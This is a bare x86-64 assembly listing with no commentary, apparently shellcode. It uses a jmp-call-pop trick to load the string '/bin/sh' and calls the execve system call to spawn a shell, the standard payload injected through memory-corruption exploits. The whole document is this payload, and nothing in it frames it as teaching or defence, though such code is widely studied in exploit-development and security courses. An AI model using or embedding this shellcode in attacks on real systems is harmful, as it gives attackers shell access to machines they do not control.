section .text
	global _start
_start:
		jmp string
		
		exec:
		pop rdi
		xor rdx , rdx
		push rdx
		push rdi
		mov rsi , rsp
		mov al , 59
		syscall
		
		string:
		call exec
		db "/bin/sh" , 0
